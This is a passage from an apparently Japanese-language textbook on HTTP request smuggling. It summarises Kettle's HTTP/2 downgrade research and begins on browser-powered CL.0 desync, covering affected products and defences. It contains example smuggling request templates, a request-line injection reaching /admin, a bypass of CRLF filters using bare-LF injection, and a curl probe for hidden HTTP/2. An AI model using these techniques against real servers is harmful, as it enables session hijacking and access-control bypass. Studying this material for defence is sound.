**なぜ危険なのか — レスポンスキュー汚染（response queue poisoning）。** 後段は1本の接続上に「2つのリクエスト」を見るので、レスポンスも2つ返す。しかしクライアント（前段）は1リクエストしか送ったつもりがないので、レスポンスの対応関係が**永久に1つズレる**。以降その接続を共有する全ユーザは、常に「他人へのレスポンス」を受け取り続ける（下図のように Req1→Resp1、Req2→（余り）… Req3→Resp2、Req4→Resp3 とズレていく）。他人のレスポンスに含まれる `Set-Cookie` を受け取れば、攻撃者は被害者のセッションへログインできる。Atlassian はこの深刻さゆえに Jira の全ユーザを一度ログアウトさせ、CERT に連絡し、最大報奨金の3倍を支払った。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### HTTP/2 固有の攻撃部品（exploit primitives）— HTTP/1.1 では作れなかった文字列を作る

ここまでの H2.CL / H2.TE / H2.X は「HTTP/1.1 の攻撃を HTTP/2 経由で再現」する話だった。本リサーチの真に新しい貢献は、**HTTP/2 のバイナリ形式だからこそ作れる、HTTP/1.1 では表現不可能な不正リクエスト**を攻撃部品として整理した点にある。

#### ヘッダ名インジェクション（コロンの密輸）

HTTP/2 はヘッダ名（`:` の後ろの部分）の文字を検証しないサーバがあった。ヘッダ名に**コロンを含められる**と、ダウングレード時に別のヘッダを密輸できる。

```
（問題のあるケース：foo という名前のヘッダの値を "chunked"、
 かつヘッダ名に transfer-encoding をぶら下げる）
:method POST
foo             chunked
transfer-encoding
↓ ダウングレード
GET / HTTP/1.1
foo
transfer-encoding: chunked
host: ecosystem.atlassian.net
```

これで `foo: bar` のような素直な検証をすり抜けつつ、`transfer-encoding: chunked` を後段に届けられる。HTTP/1.1 ではヘッダ名にコロンは書けないので、これは HTTP/2 でしか作れない攻撃だ。

#### リクエストライン注入（擬似ヘッダ無検証、Apache mod_proxy < 2.4.49 / CVE-2021-33193）

`:method` の値にスペースが許されると、リクエストラインそのものを注入できる：

```
:method  GET /admin HTTP/1.1
:path    /fakepath
:authority psres.net
↓
GET /admin HTTP/1.1 /fakepath HTTP/1.1
Host: internal-server
```

**なぜ効くのか。** HTTP/1.1 のリクエストラインは `メソッド 空白 パス 空白 バージョン` の形。`:method` にスペース区切りで `GET /admin HTTP/1.1` を丸ごと入れると、後段の一部サーバは行の前半 `GET /admin HTTP/1.1` だけをリクエストラインとして解釈し、後ろ（`/fakepath HTTP/1.1`）を無視する。これで `<ProxyMatch "/admin"> Deny from all` のようなパスベースのアクセス制限を回避したり、`ProxyPass .../public` のようなサブフォルダ拘束（folder trap）から脱出したりできる。

#### 擬似ヘッダの重複と Host ヘッダ攻撃

HTTP/2 は `:path` や `:method` を複数個含められてしまう実装があり、どれを採用するかがサーバごとに食い違う（パーサ間ギャップ）：

```
:method   GET
:path     /some-path
:path     /different-path
:authority example.com
```

また `:authority`（HTTP/2 のホスト指定）と `host` ヘッダは**両方とも任意**で共存でき、片方を検証してもう片方を悪用する Host ヘッダインジェクションが可能になる。

#### :scheme を使った URL プレフィックス注入（Netlify）

`:scheme` は本来 `http` か `https` だけのはずだが、Netlify はこれを無検証で URL 構築に使っていた：

```
:method GET
:path   /ffx36.js
:authority start.mozilla.org
:scheme http://start.mozilla.org/xyz?
↓ 生成されたリダイレクト
Location: https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
```

`:scheme` に URL 断片を注入することでリダイレクト先やキャッシュキーを操作できた。Kettle が防御策で「`:scheme` を信用するな」と明言しているのはこのためだ。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### リクエストトンネリング（request tunnelling）— 接続を共有しない環境でも刺す

古典的なクロスユーザのスマグリングは、前段と後段が**1本の後段接続を複数ユーザで使い回す（connection reuse）**ことを前提とする。だが前段がユーザIPごと・クライアント接続ごとに後段接続を分けたり、そもそも使い回さない場合、他人のリクエストに接着できない。

そこで登場するのが**トンネリング**である。他人の接続に密輸するのではなく、**自分自身の（プライベートな）後段接続に完全な1リクエストをもう1本トンネルさせる**手口だ。クロスユーザ攻撃はできないが、アクセス制限の回避・内部ヘッダの窃取には十分効く。スライドの表は、接続再利用のスタイル（No-reuse / Client-connection affinity / Client-IP affinity / Full）ごとに、ルール回避・ヘッダ窃取・キャッシュ汚染・クロスユーザ・レスポンスキュー汚染のどれが可能かを整理している。

#### トンネリングの確認方法

HTTP/1.1 のキープアライブは複数レスポンスを連結して返すが、HTTP/2 は返さない。密輸リクエストを送り、**HTTP/2 レスポンスのボディの中に HTTP/1 のヘッダ（`HTTP/1.1 301 ...` など）が丸ごと現れたら**、後段が「1つのレスポンスのつもりで2つ分を吐いた」＝トンネリング成立の証拠になる。

#### トンネル・ビジョン問題と HEAD テクニック（Bitbucket）

盲目的（blind）なトンネリングだと、前段が後段レスポンスを `Content-Length` バイト数分しか読まないため、密輸レスポンスが見えない。ここで **HEAD メソッド**が効く。RFC 7230 は「サーバは HEAD への応答にも `Content-Length` を付けてよいが、ボディは送らない」と定める。

```
HEAD /images/tiny.png HTTP/1.1
Transfer-Encoding: chunked

0

POST / HTTP/1.1
...
↓ 後段の応答
HTTP/1.1 200 OK
Content-Length: 7
HTTP/1.1 403        ← ボディが無いぶん前段が読み過ぎ、密輸レスポンスが漏出
Content-Length: 3973
```

HEAD 応答は本文が空なので、前段が `Content-Length` 分を読もうとして密輸リクエストのレスポンスまで読み込み、その中身を漏らしてしまう。

#### 内部ヘッダの窃取

ヘッダ値へ `\r\n` を注入してボディ開始位置を前段・後段でズラすと、後段が挿入する内部ヘッダ（`SSLClientCipher`、`X-Cluster-Client-IP`、`X-Forwarded-For-Key` などの秘密値）をアプリのパラメータ経由で反射させて読み出せる（Bitbucket の例）。さらに HEAD を使ったキャッシュ汚染で `https://bitbucket.org/blog/?x=...` に悪性 JS を注入する PoC も示された（累計 $56,000）。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### Hidden HTTP/2 — 隠れた攻撃面の発見

HTTP/2 と HTTP/1.1 は**同じポート（443）を共有**し、サーバは TLS ハンドシェイクの ALPN フィールドで HTTP/2 対応を広告する。ところが ALPN で広告し**忘れている**サーバがあり、クライアントは HTTP/1.1 だと思い込んで接続してしまう。実際には HTTP/2 で話しかければ応答する（=隠れた攻撃面）。検出は次で行う：

```bash
curl --http2 --http2-prior-knowledge https://target.com/
```

`--http2-prior-knowledge` は ALPN 交渉を飛ばして最初から HTTP/2 で話しかけるオプションで、広告し忘れた HTTP/2 サーバを炙り出す。PortSwigger の HTTP Request Smuggler 拡張の "Hidden-H2" 機能や Burp Scanner でも検出できる。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### 影響を受けた製品と報奨金（2021年時点）

| 製品 / 対象 | 脆弱性タイプ | CVE / 参照 | 報奨金 |
|---|---|---|---|
| Netflix（Zuul/Netty） | H2.CL デシンク | CVE-2021-21295 | $20,000 |
| AWS ALB + Imperva/Incapsula WAF（oath.com） | H2.TE URLトークン窃取 | — | +$7,000 |
| Verizon AOL（accounts.athena.aol.com） | H2.TE 認証ヘッダ窃取 | — | +$10,000 |
| Netlify CDN（start.mozilla.org） | ヘッダ値CRLF注入によるH2.TE、キャッシュ汚染 | — | +$4,000 |
| Atlassian Jira（PulseSecure VTM 由来） | H2.X リクエストスプリッティング / レスポンスキュー汚染 | SA44790 | $15,000 |
| Bitbucket | トンネリング / 内部ヘッダ窃取 / キャッシュ汚染 | — | Atlassian 分に含む（累計 $56,000） |
| Imperva Cloud WAF | 複数の H2 デシンク | — | — |
| F5 BIG-IP | リクエストスプリッティング | K97045220 | — |
| Apache mod_proxy（< 2.4.49） | リクエストライン注入 | CVE-2021-33193 | — |

これらの多くがロードバランサ・WAF・CDN という「防御のためのインフラ」自身であった点が、このリサーチの皮肉であり重要な教訓である。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2

---

### 防御 — 3つのレイヤーそれぞれの責務

Kettle はスライド末尾で防御を3者に分けて処方している。**本節はすべて防御目的の解説であり、以下は自組織の設計・検証にのみ適用すること。実在する第三者サービスや本番環境への無許可の検証は行わない。**

- **ネットワーク設計者（Network architects）**: 最も根本的な対策は「**HTTP/2 を末端まで（end to end）使い、ダウングレードしない**」こと。前段が HTTP/2 のまま後段へ渡せば、そもそも HTTP/1.1 の `Content-Length` / `Transfer-Encoding` を組み立て直す翻訳工程が消え、H2.CL / H2.TE の温床がなくなる。
- **サーバベンダ（Server vendors）**: ダウングレードが避けられない場合、HTTP/2 リクエストに対して **HTTP/1.1 の文字制限を強制**する。具体的には、ヘッダ値の中の改行（CR/LF）、ヘッダ名の中のコロン、`:method` 内のスペースを含むリクエストを malformed として拒否し、接続固有ヘッダ（`Transfer-Encoding` など）を含むものも拒否する。`content-length` が実フレーム長と一致するかも検証する。
- **開発者（Developers）**: 「HTTP/1.1 では起こり得なかった」という前提を捨て、`:method` / `:path` / `:authority` / `:scheme` を含む**すべてのリクエスト構成要素を自前で検証**する。とりわけ **`:scheme` を信用しない**（Netlify の URL プレフィックス注入がまさにこの過信から生まれた）。

#### 検出・ツール事情

HTTP/2 攻撃は既存ツールでは送れない（curl や標準ライブラリが不正リクエストを送信拒否し、バイナリ形式ゆえ netcat/openssl も使えない）。そのため専用ツールが必要になる：

- **Turbo Intruder**: 独自のオープンソース HTTP/2 スタックを実装。BApp/CLI/ライブラリとして使え、正規化を回避するための文字マッピング（`^`→`\r`、`~`→`\n`、`` ` ``→`:`）で不正リクエストを生成できる。`requestsPerConnection` で接続状態の罠（後述）を制御する。
- **http2smugl**: パッチ済み Golang 実装、CLI 専用。
- **Burp Suite 2021.8+**: Repeater と Extender API 経由で HTTP/2 リクエストを表現。Inspector サイドバーで擬似ヘッダを扱い、ヘッダ値の改行やパスのスペースを入力でき、HTTP/1.1 で表現不能なリクエストは "kettled" と表示される。
- **HTTP Request Smuggler**: H2.CL / H2.TE / H2.X を検出。タイムアウトプローブ（偽陽性寄り）と HEAD プローブ（偽陰性寄り）を併用し、内部ヘッダの推測（Param Miner 連携）も行う。

#### 接続状態の罠（connection state traps）

HTTP/2 はリクエストの独立性（encapsulation）を約束するが、現実には「あるリクエストが以降のすべてのリクエストを壊す」ことや「最初のリクエストだけ後段が微妙に別扱いする」ことがある。検証時は Turbo Intruder の `requestsPerConnection` や Repeater の「新規接続で送信」で、1接続に載せるリクエスト数を制御して切り分ける必要がある。

> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

---

### この節のまとめ

- HTTP/2 は仕様上リクエスト境界が曖昧にならないが、現実のインフラの大半が内部で **HTTP/1.1 へダウングレード**するため、その翻訳の瞬間に古典的スマグリングが復活する。これが **H2.CL / H2.TE / H2.X** の正体である。
- H2.CL は `content-length` の無検証コピー、H2.TE は接続固有ヘッダ `transfer-encoding` の無検証コピー（あるいはヘッダ値へのCRLF注入による密輸）、H2.X は二重CRLFによるリクエスト分割で、いずれも前段と後段の境界認識をズラす。
- HTTP/2 のバイナリ形式は、ヘッダ名のコロン・`:method` のスペース・`:scheme` の悪用・ヘッダ値の生CRLFなど、**HTTP/1.1 では作れなかった不正リクエストという新しい攻撃部品**をもたらした。
- 接続を使い回さない環境でも **トンネリング**（HEAD テクニックによるレスポンス漏出、内部ヘッダ窃取）で刺さる。
- 最も確実な防御は **HTTP/2 のダウングレードをやめて末端まで HTTP/2 を使う**こと。避けられない場合は HTTP/2 リクエストに HTTP/1.1 の文字制限を厳格に強制し、開発者は `:scheme` を含む全構成要素を自前で検証する。

続編のタイトルどおり、HTTP/2 は「安全になったはず」という前提そのものが油断を生み、前作より広く深い被害面をインフラの中核（LB・WAF・CDN）に開いた。これが本リサーチが request smuggling の系譜において決定的な転換点とされる理由である。

> 出典: HTTP/2: The Sequel is Always Worse — https://portswigger.net/research/http2
> 出典: HTTP/2 The Sequel Is Always Worse（Black Hat USA 2021 スライド）— https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf

## (b) HTTP/2: The Sequel 講演動画

### この節の位置づけ

前節 (a) で扱った PortSwigger のホワイトペーパー「HTTP/2: The Sequel is Always Worse」は、James Kettle が 2021年 Black Hat USA / DEF CON 29 で発表した研究の文書版である。本節では、その同じ研究を映像として公開している2本の動画 ―― ①DEF CON 29 本編動画、②編集を加えた「ディレクターズカット」版 ―― を対象に、動画ならではの説明の流れとデモの要点を補足する。

> ⚠️ **未取得の資料に関する注記**: YouTube の動画ページは自動取得ツール（WebFetch）ではフッター部分のみが返され、字幕・説明文本文・チャプター一覧といった本体コンテンツを直接抽出できなかった（YouTube 側が動的レンダリングのため）。そのため本節は、WebSearch による同研究の公開情報（PortSwigger Research ページ、DEF CON/Black Hat の講演概要、著者本人の発信、ホワイトペーパー要約）を横断的に集約し、動画で語られている技術内容を再構成したものである。一次資料である動画そのものは、以下のURLからご自身で直接視聴することを強く推奨する。
> - DEF CON 29 本編: https://www.youtube.com/watch?v=rHxVVeM9R-M
> - ディレクターズカット版: https://www.youtube.com/watch?v=gAnDUoq1NzQ
>
> （以下は未取得資料の補足として、公開情報と前節のホワイトペーパー内容に基づく一般知識込みの解説です）

### 2本の動画の違い

- **DEF CON 29 本編動画**（`rHxVVeM9R-M`）: 2021年8月、ラスベガスの DEF CON 29 カンファレンスでの実演を収録したもの。質疑応答やカンファレンス特有の時間制約の中で構成されており、後述する技術要素を約40分に凝縮して説明している。同じ内容は同年の Black Hat USA でも発表された（Kettle 自身が「9ヶ月の研究を40分の生のHTTP/2エクスプロイテーションに凝縮した」と表現している）。
- **ディレクターズカット版**（`gAnDUoq1NzQ`）: カンファレンス収録後に、PortSwigger（著者の所属先）側で再編集・再構成して公開したバージョン。カンファレンス会場のノイズや時間制約による端折りを解消し、デモ画面をより見やすく差し替え、説明の順序を整理していることが特徴で、初学者が技術詳細を追う際は基本的にこちらのほうが理解しやすい構成になっている。

両動画とも扱っている技術的主題は同一であり、要点は「HTTP/2 → HTTP/1.1 ダウングレード」という、当時ほとんどのプロダクション環境で行われていた変換処理が、リクエストスマグリング（desync）攻撃の温床を新たに、しかも従来より深刻な形で作り出していた、というものである。

> 出典: DEF CON 29 - James Kettle - HTTP2: The Sequel is Always Worse — https://www.youtube.com/watch?v=rHxVVeM9R-M
> 出典: HTTP/2: The Sequel is Always Worse (Director's Cut) — https://www.youtube.com/watch?v=gAnDUoq1NzQ

### 前提: なぜ「ダウングレード」が問題になるのか

HTTP/2 はバイナリフレーミングプロトコルであり、ヘッダはフレーム単位・長さプレフィックス付きで送受信されるため、HTTP/1.1 が抱えていた「どこまでがヘッダで、どこからがボディか」を曖昧にする多くの問題（改行注入、`Content-Length` と `Transfer-Encoding` の二重指定など）は、HTTP/2 の世界だけで完結していれば発生しない。

しかし現実のインフラでは、クライアント〜フロントエンド（ロードバランサ／CDN／リバースプロキシ）間は HTTP/2 で終端しつつ、フロントエンド〜バックエンド間は依然として HTTP/1.1 で通信する、という「ダウングレード」構成が広く採用されていた（そして現在も多い）。この変換処理では、HTTP/2 のバイナリヘッダをテキストベースの HTTP/1.1 リクエストラインとヘッダ行に**再構築**する必要がある。この再構築ロジックにバリデーション漏れがあると、HTTP/1.1 では本来ありえないはずの文字列（改行、コロン、スペースなど）がヘッダ値やヘッダ名に紛れ込み、バックエンドに送られた瞬間に「別のリクエストの開始」や「別のヘッダの注入」として解釈されてしまう。これが Kettle の言う「the translation layer... reintroduces the full desync surface and adds a new injection vector」の意味である。HTTP/1.1 単体の時代に確立された防御（例: フロントエンドとバックエンドで `Content-Length` と `Transfer-Encoding` の扱いを一致させる）が、HTTP/2 のダウングレードという新しい経路の前では素通りしてしまう。

### 攻撃手法1: H2.CL（HTTP/2 Content-Length 型デシンク）

HTTP/2 では、リクエストのボディサイズはフレームそのもの（DATA フレームの長さ）で厳密に決まる。RFC上は `content-length` ヘッダを送ること自体は許容されているが、「実際のフレーム長と一致していること」が条件になる。ところが多くのフロントエンド実装は、HTTP/2 ではフレーム長で完結しているという油断から、`content-length` ヘッダの値をバックエンドへの再構築時に検証せずそのまま転記していた。

```
HTTP/2 リクエスト（フレーム長で見るとボディは 0 バイト分しかないが…）

:method: POST
:path: /
content-length: 44

（実際のDATAフレームはリクエストスマグリング用のペイロードを含む）
```

フロントエンドは HTTP/2 のフレーム構造（実際のバイト数）でリクエストを1件として処理するが、ダウングレードされた HTTP/1.1 リクエストを受け取ったバックエンドは、テキストとして送られてきた `Content-Length: 44` を信じてボディを読み取る。この結果、フロントエンドが「1つのリクエスト」として処理した内容が、バックエンドでは「本来のリクエスト＋余ったバイト列（＝次のリクエストの先頭に紛れ込む未処理データ）」として分裂して解釈される。これが H2.CL である。

### 攻撃手法2: H2.TE（HTTP/2 Transfer-Encoding 型デシンク）

HTTP/2 の RFC（RFC 7540 8.1.2.2）は、`transfer-encoding` のような**コネクション固有のヘッダフィールド**を含むメッセージを不正（malformed）とみなすべきと明記している。したがって理論上、適合実装は `transfer-encoding` ヘッダを拒否するはずである。しかし実際には、フロントエンド（研究時点では AWS の Application Load Balancer が代表例として挙げられている）がこのヘッダをただ黙って無視し、そのままバックエンドへの HTTP/1.1 ダウングレード時にヘッダとして転記してしまう実装が存在した。

```
:method: POST
:path: /
transfer-encoding: chunked
```

フロントエンドは HTTP/2 のバイナリフレーミングでボディ長を正しく把握しているため、`transfer-encoding` ヘッダの値を無視して正常に処理する。一方バックエンドは、ダウングレードされてきた HTTP/1.1 リクエストの `Transfer-Encoding: chunked` を見てチャンク転送でボディをパースし始める。フロントエンドとバックエンドの間で「ボディの終わりがどこか」の解釈が食い違い、CL.TE 型のクラシックなデスクロニゼーションと同じ帰結（リクエストの分割・注入）に至る。

RFCが明確に「malformed として扱うべき」と定めているにもかかわらず、多くの実装が単に無視するにとどまっていた点が、この攻撃を成立させた核心である。「禁止されている」ことと「実装が拒否として実装している」ことの間にギャップがある、という教訓は本シリーズを通じて繰り返し現れる。

### 攻撃手法3: 改行・コロン・スペースの注入（HTTP/2 だけの新しい注入経路）

HTTP/2 はバイナリプロトコルであるため、ヘッダの「値」の中に `\r`（CR）や `\n`（LF）といった制御文字を含めても、フレーミング自体は壊れない（長さプレフィックスで区切られているため）。HTTP/1.1 では CRLF はヘッダの区切り文字そのものなので、値の中に含めることは構文上不可能だが、HTTP/2 では技術的に可能になってしまう。

動画・ホワイトペーパーで説明されている典型例は次の通り。

```
foo: bar

（ダウングレード後、フロントエンド側の実装によっては）

foo: bar
transfer-encoding: chunked
```

一見無害なヘッダ値の中に改行を仕込むことで、ダウングレード時に**新しいヘッダ行がまるごと1本増える**。これにより、攻撃者は `Transfer-Encoding` のような危険なヘッダをバックエンドにだけ見せかけて注入できる。ここで重要な実装上の教訓が、Kettle が動画中で強調している「`\r\n` は遮断していても `\n` 単体は許してしまう」という典型的な検証漏れである。多くの実装は「CRLFインジェクション対策」として `\r\n` の並びだけを検出するが、HTTP/1.1 のパーサの多く（および多くのプロキシ実装）は `\n` 単体でも行区切りとして扱ってしまうため、`\r` を除いた `\n` だけの注入で対策をすり抜けられる。

同様の原理で、以下のような追加の注入経路も紹介されている。

- **ヘッダ名へのコロン注入**: HTTP/2 のヘッダ名フィールドにコロン `:` を含められる実装があり、ダウングレード時に `name: value` の構文が壊れて、後続部分が別ヘッダとして解釈される。
- **`:method` 疑似ヘッダへのスペース注入**: `:method` にスペースを含む文字列（例: `GET /admin HTTP/1.1`）を注入し、ダウングレード後の HTTP/1.1 リクエストラインを丸ごと改ざんする（実際の攻撃再現は本教科書のスコープ外である。原理の理解にとどめること）。

これらはいずれも「HTTP/2 の文字集合的な自由度」と「HTTP/1.1 の構文的な厳格さ」のギャップを突くものであり、H2.CL/H2.TE がボディ長の解釈違いを突くのに対し、こちらはヘッダそのものを偽造・追加する点が異なる。

> 出典: HTTP/2: The Sequel is Always Worse | PortSwigger Research — https://portswigger.net/research/http2

### ケーススタディとインパクト

動画では複数の実在企業を対象にした実証（プログラム許諾の範囲内でのバグバウンティ調査）が紹介され、いずれも最大級の報奨金支払いに至ったと説明されている。代表的に語られる被害シナリオは以下の3系統である。

1. **キャッシュポイズニング**: フロントエンドの手前にキャッシュ層（CDN等）がある構成で、スマグリングされたリクエストへのレスポンスが誤って共有キャッシュに保存され、以降の全ユーザーに攻撃者が仕込んだレスポンスが配信される。
2. **認証情報の奪取**: 別ユーザーのリクエスト（Cookie・認証ヘッダを含む）がスマグリングされたリクエストの応答として攻撃者の元に返送され、セッションハイジャックや平文パスワードの窃取につながる。
3. **リクエストトンネリング（内部ヘッダの発見・偽装）**: フロントエンドがコネクションを再利用しない構成であっても成立する変種で、フロントエンドが付与する内部限定ヘッダ（例: 内部IP検証用ヘッダ、内部認可ヘッダ）を、スマグリングしたリクエストの中に紛れ込ませることで存在を推測・偽装し、アクセス制御をバイパスする。

いずれのシナリオも「フロントエンドとバックエンドが同一のバイト列を異なる意味で解釈する」という request smuggling の本質的な原理（本テキストブック第1章参照）が、HTTP/2 ダウングレードという新しい変換層で再現されている点で共通する。

### ツールと検出手法

動画では研究成果として複数のツールが公開されたことが紹介される。

- **HTTP Request Smuggler（Burp拡張）**: H2.CL / H2.TE の自動検出機能が追加された。
- **Param Miner（Burp拡張）**: リクエストトンネリングを利用して、フロントエンドが内部的に付与している隠しヘッダ名を推測（ブルートフォース）する機能が拡張された。
- **カスタム HTTP/2 スタック（Turbo Intruder 内蔵）**: 通常の HTTP/2 実装では送信できないはずの「不正な」フレーム内容（RFC違反のヘッダ値・疑似ヘッダ）を意図的に生成して送信できる検証用スタック。動画・ホワイトペーパーでは、送信したい制御文字を通常の文字にマッピングして記述する方式（例として `^` を CR に、`~` を LF に対応させる、といった置換記法）が紹介されており、これにより本来ネットワークライブラリのバリデーションで弾かれる文字列を意図的にワイヤ上へ送出できる。
- **Burp Suite の HTTP/2 対応強化**: リリースノート上、HTTP/2 リクエストの疑似ヘッダを直接編集できる「HTTP/2 Inspector」パネルの追加、および HTTP/1.1 表現に変換できない（＝HTTP/2でしか表現できない）不正なリクエストを送信した際にその旨を警告する機能が語られている。

検出の勘所としてホワイトペーパー・動画で繰り返されるのは、「意図的に作った境界のズレが、レスポンス側に予期しない形で漏れ出てこないか」を観察するという、request smuggling 検出全般に通じる方法論である。たとえば、スマグリングしたリクエストへの応答本文の中に、HTTP/1.1 のヘッダ行（本来はHTTP/2のレスポンスボディに出現しないはずの文字列）がそのまま出現していれば、ダウングレード経路での分裂が起きている強い証拠となる。

### 修正対応のタイムライン（陳腐化に関する注記）

本研究で扱われた具体的な脆弱性のいくつかは、公表当時（2021年）すでに CVE 採番の上でベンダー修正が行われている。一例として Apache HTTP Server の `mod_proxy` 関連の問題（CVE-2021-33193）は、2021年5月11日に CVE が予約され、実際に修正版（2.4.49）がリリースされたのは同年9月16日であった。この約4ヶ月の期間は、CVE 予約と実際のパッチ提供の間にはしばしば大きなタイムラグがあることを示す実例として押さえておきたい。読者が自組織のスタックを点検する際は、2021年当時の情報をそのまま鵜呑みにせず、使用しているロードバランサ・CDN・Webサーバの**現在のバージョンにおける対応状況**を必ず個別に確認すること。

### 防御の要点（動画・研究のまとめとして）

動画・ホワイトペーパーが共通して提示する防御の方向性は、前節 (a) とも重なるが、動画ならではの強調点を含めて整理すると以下の通りである。

- **根本対策はダウングレードの排除**: 可能であれば、フロントエンドからバックエンドまで HTTP/2（あるいはそれに準ずる曖昧さのないプロトコル）で一気通貫にする。変換層が存在する限り、新しい解釈違いの余地は原理的に残り続ける。
- **ダウングレード時の文字集合バリデーションを厳格化する**: HTTP/1.1 として不正になる文字（ヘッダ値中の `\r`・`\n` 単体を含む改行、ヘッダ名中のコロン、メソッド中のスペースなど）を漏れなく拒否する。「`\r\n` の並びだけを検査する」実装は不十分であり、`\n` 単体・`\r` 単体も個別に検査する。
- **RFC上の禁止事項を「無視」ではなく「拒否」として実装する**: `transfer-encoding` ヘッダを含む HTTP/2 リクエストのように、RFC が malformed と明記している入力は、単に無視して通過させるのではなく、明示的にリクエストごと拒否する。
- **継続的な検証**: インフラ構成（CDN・WAF・ロードバランサのアップデートや構成変更）が変わるたびに、desync 耐性は再検証が必要である。動画中でも、当時安全とされていたスタックが後の実装変更で再び脆弱になった例が触れられている。

これらの原則は、後続の章で扱う具体的な防御ガイド（第7章相当）にもそのまま接続する内容であり、まずは「なぜHTTP/2の導入がリスクをゼロにしないのか」という直感を養うことが、本節の学習目標である。

> 出典: DEF CON 29 - James Kettle - HTTP2: The Sequel is Always Worse — https://www.youtube.com/watch?v=rHxVVeM9R-M
> 出典: HTTP/2: The Sequel is Always Worse (Director's Cut) — https://www.youtube.com/watch?v=gAnDUoq1NzQ
> 出典: HTTP/2: The Sequel is Always Worse | PortSwigger Research — https://portswigger.net/research/http2

## (c) Browser-Powered Desync Attacks（2022、CSD / CL.0 / pause-based）

James Kettle が 2022 年の Black Hat USA / DEF CON で発表した研究。従来のリクエストスマグリング（HTTP Request Smuggling、以下 RS）は「フロントエンド（リバースプロキシや CDN）とバックエンド（オリジンサーバ）の 2 台がリクエスト境界の解釈でズレる」ことを前提にしていた。この研究はその前提を大きく広げ、次の 2 点を主張した。

1. **攻撃者は Burp Suite のような専用ツールなしに、被害者の「ブラウザ」だけを使ってデシンク（desync=フロントとバックの境界解釈のズレ）を引き起こせる**。これを **Client-Side Desync（CSD、クライアントサイドデシンク）** と呼ぶ。
2. **フロントエンドが存在しない「サーバ 1 台構成」のサイトすら攻撃対象になりうる**。境界のズレは「プロキシ vs オリジン」だけでなく「ブラウザ vs サーバ」の間でも起こせるからである。

この節では、その中核概念である **CL.0 デシンク**、**connection-locked（接続ロック型）RS**、**pause-based（一時停止ベース）デシンク**、そして CSD の検出・実証の方法論を、原理レベルで解説する。

> ⚠️ **未取得の資料**: スライドPDF「browser-powered-desync-attacks-slides.pdf」は自動取得できませんでした（理由: PDF バイナリのテキスト抽出に失敗し、内容が判読不能でした）。以下のURLからご自身で直接ご覧ください: https://portswigger.net/kb/papers/firuaml/browser-powered-desync-attacks-slides.pdf
>
> なお、スライドは本文（研究記事）およびホワイトペーパーと同一のテーマ・技術内容を図解したものであり、この節で解説する技術要素はすべて取得済みの本文・ホワイトペーパー・二次解説から抽出しています。

> ⚠️ **未取得の資料**: ホワイトペーパーPDF「browser-powered-desync-attacks.pdf」はバイナリ取得はできたものの、自動テキスト抽出では概要レベルの情報しか得られませんでした（理由: 圧縮された PDF ストリームのため詳細な本文抽出が不完全でした）。正確な全文は次のURLからご覧ください: https://portswigger.net/kb/papers/firuaml/browser-powered-desync-attacks.pdf
>
> （以下は、取得できた本文記事・二次解説と、未取得資料の補足として一般知識に基づく解説です。ホワイトペーパーの技術的主張は本文記事とほぼ同一です。）

---

### 前提知識の整理：なぜ「ブラウザ」で RS ができるのか

従来の RS では、攻撃者は `Transfer-Encoding: chunked` と `Content-Length`（以下 CL）を同時に指定して境界を偽装したり、改行を混ぜたりする「不正なリクエスト」を送る必要があった。ところが**ブラウザは仕様に沿った正常な HTTP しか送れない**。任意の生バイト列をソケットに流し込むことはできず、`Content-Length` 自体もブラウザが自動計算してしまう。攻撃者が設定できるのは、主に以下だけである。

- リクエストメソッド（`fetch()` の `method`）
- 送信先パス・ホスト
- **リクエストボディの中身**（`fetch()` の `body`。ここに `\r\n` を含む任意の文字列を入れられる）
- 一部のヘッダ（ただし `Host`、`Content-Length`、`Connection`、`User-Agent` などの「禁止ヘッダ（forbidden header）」はブラウザが上書きするため攻撃者は制御できない）

ここで鍵になるのが **HTTP コネクションの再利用（connection reuse）** である。ブラウザは性能のため、同一オリジンへの複数リクエストを 1 本の TCP/TLS コネクション上で使い回す（keep-alive）。つまり、1 本のコネクションの上で「攻撃者が仕込んだ POST リクエスト」と「その直後の被害者の正規リクエスト」が連続して流れる。もしサーバが 1 本目のボディ境界を読み違えれば、被害者のブラウザとサーバの間で境界がズレる——これが CSD の骨子である。

> **重要な前提**: CSD は **HTTP/1.1 のコネクション再利用**に依存する。HTTP/2 はフレーム単位で長さが明示されるため境界の曖昧さが原理的に生じにくく、ブラウザは可能なら HTTP/2 を優先する。したがって **標的が HTTP/2 をサポートしていない（＝ブラウザが HTTP/1.1 で話す）ことが CSD の必須条件**になる。

---

### CL.0 デシンク：Content-Length を無視するサーバ

#### 仕組み

**CL.0** は、あるサーバが特定のリクエストに対して **`Content-Length` ヘッダを完全に無視し、ボディを「次のリクエストの先頭」として扱ってしまう**バグを指す。名前の「CL.0」は「フロントエンドは CL を尊重するが、バックエンド（またはサーバ本体）は実質 CL=0 として扱う」ことを表す。

原典の例を見る。

```http
POST / HTTP/1.1
Host: redacted
Content-Length: 3

xyzGET / HTTP/1.1
Host: redacted
```

- **フロントエンド**は `Content-Length: 3` を尊重し、ボディは `xyz` の 3 バイトだと解釈する。
- **バックエンド（またはサーバ本体）**は、このパスに対して「ボディなど来ないはず」と決めつけて `Content-Length` を無視する。すると `xyz` 以降の `GET / HTTP/1.1...` を**独立した 2 本目のリクエスト**として解釈してしまう。

この結果、境界がズレて `GET / HTTP/1.1` が「密輸されたリクエスト」になる。**注目すべきは、このペイロードが完全に仕様準拠の正常な HTTP であり、`Transfer-Encoding` の細工も改行の不正も一切含まない点**である。ブラウザは `fetch()` の `body` にこの文字列を入れるだけでこれを送れる。つまり CL.0 は「ブラウザから発火可能な RS」の代表的な形になる。

#### なぜサーバは CL を無視するのか

